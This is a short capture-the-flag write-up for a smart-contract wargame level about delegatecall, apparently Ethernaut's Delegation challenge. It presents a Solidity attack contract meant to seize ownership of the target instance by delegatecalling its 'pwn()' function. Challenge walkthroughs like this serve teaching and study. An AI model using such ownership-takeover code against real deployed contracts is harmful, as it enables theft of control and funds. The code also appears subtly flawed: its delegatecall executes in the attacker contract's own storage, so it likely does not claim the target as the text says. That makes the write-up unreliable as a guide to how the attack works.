## The goal of this level is for you to claim ownership of the instance you are given.

This level does a great job teaching about how delegatecall works and how to use delegatecall

If you don't know how it works,solidity documentation is a great way to learn it.

we can use it as below to claim ownership

```solidity
    contract hackDelegate{
        address public owner;

        constructor(address _owner){
            owner = _owner;
        }

        function pwn(address _delegation) public returns(bool){
            (bool triggered,) = _delegation.delegatecall{gas: 30000000}(abi.encodeWithSignature("pwn()"));
            return triggered;
        }
    }
```
